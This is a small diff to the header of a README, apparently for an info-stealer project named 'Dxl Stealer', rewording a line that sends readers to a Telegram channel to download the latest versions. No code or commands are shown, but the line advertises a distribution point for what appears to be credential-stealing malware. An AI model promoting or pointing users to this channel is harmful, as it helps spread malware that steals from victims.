@@ -1,6 +1,6 @@
 <h1 align="center">
    ⚔️Dxl Stealer 🛡️
-⭐https://t.me/dxlstealer⭐ DOWNLOAD LATEST VERSİONS  TELEGRAM
+⭐https://t.me/dxlstealer⭐ DOWNLOAD LATEST VERSİONS  ON TELEGRAM
 </h1>
 <p align= "center">
    <kbd>
